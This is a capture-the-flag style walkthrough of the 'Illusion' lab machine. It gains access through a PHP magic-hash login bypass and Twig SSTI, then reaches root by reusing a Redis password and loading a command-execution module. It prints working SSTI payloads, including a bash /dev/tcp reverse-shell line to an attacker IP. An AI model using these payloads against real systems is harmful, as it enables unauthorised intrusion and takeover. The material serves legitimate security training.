# Illusion

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.183.203
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 18:22 +08
Warning: 192.168.183.203 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.183.203
Host is up (0.17s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

We can start proxying traffic through Burp.&#x20;

### Web Enum --> Magic Hashes

Port 80 presents a corporate web page with a Login:

<figure><img src="../../../.gitbook/assets/image (3244).png" alt=""><figcaption></figcaption></figure>

The login page is basic and operates in PHP:

<figure><img src="../../../.gitbook/assets/image (771).png" alt=""><figcaption></figcaption></figure>

Default credentials don't work here. Brute forcing also doesn't work. Since this runs on PHP, we can try some Magic Hashes by submitting this request:

<figure><img src="../../../.gitbook/assets/image (1211).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md" %}

This works because the `Location` header points to `dashboard.php` now.&#x20;

### Orders --> SSTI

The dashboard is simple.

<figure><img src="../../../.gitbook/assets/image (776).png" alt=""><figcaption></figcaption></figure>

If we submit any queries, we can see our order name pop up on the top:

<figure><img src="../../../.gitbook/assets/image (1214).png" alt=""><figcaption></figcaption></figure>

Since this website runs on PHP and the input value is printed out on screen, I wanted to test for SSTI by using `{{7*7}}` as the name of the order, and it works:

<figure><img src="../../../.gitbook/assets/image (1762).png" alt=""><figcaption></figcaption></figure>

On Hacktricks, there's a whole section for Twig (PHP), and I tried their payload to run `id`:

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

<figure><img src="../../../.gitbook/assets/image (3317).png" alt=""><figcaption></figcaption></figure>

This confirms that SSTI works and we have RCE on the machine. Sending this payload gets us a reverse shell:

```
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/192.168.45.208/4444 0>&1'")}}
```

<figure><img src="../../../.gitbook/assets/image (1596).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Redis Creds --> RCE

Within the user's directory, there was a Redis related file that contained a hash:

```
www-data@illusion:/home/james$ ls
local.txt  redis-openssl-gen-pass.txt
www-data@illusion:/home/james$ cat redis-openssl-gen-pass.txt 
sgm5ZgEsCrj4L/0fi/1XGUcGII2GTuAjo3eotCFNy6ZManKrLWQaRCTOE6QpyCojpyr+Rix12VYbdOkA
```

Checking the listening ports using `netstat` reveals that port 6379 is listening and is likely Redis:

```
www-data@illusion:/home/james$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -   
```

We can port forward this using `chisel`. Afterwards, we can access the Redis database using `redis-cli`. Attempts to run commands fail because we aren't authenticated:

```
$ redis-cli -h 127.0.0.1
127.0.0.1:6379> INFO
NOAUTH Authentication required.
```

In this case, we can try the hash that we found earlier.&#x20;

```
127.0.0.1:6379> AUTH sgm5ZgEsCrj4L/0fi/1XGUcGII2GTuAjo3eotCFNy6ZManKrLWQaRCTOE6QpyCojpyr+Rix12VYbdOkA
OK
127.0.0.1:6379> INFO
# Server
redis_version:6.2.6
<TRUNCATED>
```

There was nothing within the database that was interesting, but I did want to know who was running it. A quick `ps -elf` reveals that the `root` user is running it:

```
www-data@illusion:/home/james$ ps -elf |grep redis
5 S root         893       1  0  80   0 - 13071 -      10:21 ?        00:00:00 /usr/local/bin/redis-server 127.0.0.1:6379
0 S www-data    3221    3025  0  80   0 -  1625 pipe_w 10:37 pts/0    00:00:00 grep redis
```

Since `root` is running it and we can login, this means that we can also load any module that we want. This repository has a module that works:

{% embed url="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" %}

Compile and upload the `.so` file to the machine. Then, load it within `redis-cli`:

<figure><img src="../../../.gitbook/assets/image (1590).png" alt=""><figcaption></figcaption></figure>

We can get a reverse shell via `system.rev <IP> <PORT>`:

<figure><img src="../../../.gitbook/assets/image (1594).png" alt=""><figcaption></figcaption></figure>

Rooted!
